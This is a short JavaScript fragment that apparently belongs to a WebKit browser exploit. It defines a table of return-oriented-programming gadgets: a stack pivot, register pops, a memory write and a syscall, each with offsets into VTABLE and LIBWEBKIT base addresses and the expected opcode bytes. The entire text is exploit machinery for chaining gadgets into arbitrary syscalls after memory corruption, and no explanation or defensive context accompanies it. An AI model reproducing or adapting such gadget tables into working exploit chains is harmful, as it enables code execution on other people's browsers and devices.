gadgets = {
    'xchg rax, rsp; dec dword ptr [rax - 0x77]': new gadget(VTABLE, 0x00148dfb - ((0x50000 * 4) * 26), [0x48, 0x94, 0xFF, 0x48, 0x89]),
    'pop rcx; pop rcx': new gadget(VTABLE,0x0016c49c - (((0x50000 * 4) * 26) - (1572864 * (10 + 6))), [0x59, 0x59]),
    'pop rcx': new gadget(VTABLE, 0x0007662b - ((0x50000 * 4) * 26), [0x59]),
    'add dword ptr [rax - 0x77], ecx': new gadget(VTABLE, 0x00001279 - ((0x50000 * 4) * 26), [0x01, 0x48, 0x89]),
    'pop rdi': new gadget(VTABLE, 0x000c7cdc - ((0x50000 * 4) * 26), [0x5f]),
    'mov qword ptr [rdi], rax': new gadget(VTABLE, 0x0000181f - ((0x40000 * 4) * 26), [0x48, 0x89, 0x07]),
    'pop rsi': new gadget(VTABLE, 0x000a08c6 - ((0x50000 * 4) * 26), [0x5E]),
    'pop rdx': new gadget(VTABLE, 0x0000832b - ((0x40000 * 4) * 26), [0x5A]),
    'pop rax': new gadget(VTABLE, 0x0002ea47 - ((0x50000 * 4) * 26), [0x58]),
    'syscall': new gadget(LIBWEBKIT, 0x000777b0 + 1572864 * 18, [0x0F, 0x05]),
    'pop rsp': new gadget(VTABLE, 0x00029f5d - ((0x50000 * 4) * 26), [0x5C]),
    'mov rax, qword ptr [rax]': new gadget(VTABLE, 0x00064214 - ((0x50000 * 4) * 26), [0x48, 0x8B, 0x00]),
    'pop r8': new gadget(LIBWEBKIT, 0x0008c9b6, [0x47, 0x58]),
    'pop r9': new gadget(LIBWEBKIT, 0x0012f5b7 + 1572864 * 6, [0x47, 0x59])
}
